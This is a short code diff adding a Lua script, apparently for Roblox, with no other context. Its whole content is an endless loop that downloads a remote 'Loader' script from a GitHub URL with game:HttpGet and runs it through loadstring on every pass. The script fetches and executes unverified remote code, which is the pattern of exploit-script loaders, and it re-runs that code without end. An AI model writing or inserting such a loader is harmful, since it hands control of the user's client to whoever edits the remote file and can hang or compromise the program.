@@ -1,0 +1,3 @@
+while true do
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/virtuallcalling/Loader/main/index.lua"))();
+end
